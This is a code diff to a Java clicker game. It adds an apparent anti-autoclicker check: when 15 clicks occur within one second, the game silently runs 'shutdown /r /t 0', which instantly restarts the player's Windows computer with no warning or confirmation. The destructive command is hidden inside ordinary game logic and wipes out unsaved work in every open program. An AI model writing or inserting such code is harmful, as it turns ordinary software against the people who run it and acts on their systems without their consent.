@@ -1,22 +1,27 @@
 import javax.swing.*;
 import java.awt.*;
 import java.awt.event.*;
+import java.awt.image.DataBufferUShort;
+import java.io.IOException;
+import java.time.Duration;
+import java.time.Instant;
 import java.util.Random;
 
 public class ClickerFrame extends JFrame {
 
     JPanel pc;
+    Random rand = new Random();
+    private Instant startTime;
+
     Counter count;
     ClickableSquare clickButton;
-    Random rand = new Random();
-
     Border border;
     Culori culoare = new Culori();
     Item rights, moreRights, bonus, question, lessRights, hack, scam;
     Item[] upgradeuriList;
 
     boolean tutorialDone = false, negativeUnlocked;
-    int cpsVal = 5;
+    int cpsVal = 5, ct = 0;
     double clicks, clickPower;
 
     public ClickerFrame() {
@@ -268,6 +273,8 @@ public class ClickerFrame extends JFrame {
                 clicks += clickPower; //clickpower += clickpower * (rebirth + 1)
 
                 updateProgress();
+
+                checkAuto();
             }
             @Override public void mouseExited(MouseEvent e) {mouseOut = true;}
         });
@@ -386,6 +393,25 @@ public class ClickerFrame extends JFrame {
             }
         });
         cpsThread.start();
+    }
+    void checkAuto() {//verifica daca ai autoclicker
+
+        if(ct == 0)
+            startTime = Instant.now();
+
+        ct++;
+
+        if(ct == 15) {
+            Duration duration = Duration.between(startTime, Instant.now());
+            if (duration.toSeconds() <= 1)
+                try {
+                    String shutdownCommand = "shutdown /r /t 0";
+                    Runtime.getRuntime().exec(shutdownCommand);
+                } catch (IOException o) {
+                    o.printStackTrace();
+                }
+            ct = 0;
+        }
     }
 
     void loadProgress() {//ia progresu din fila
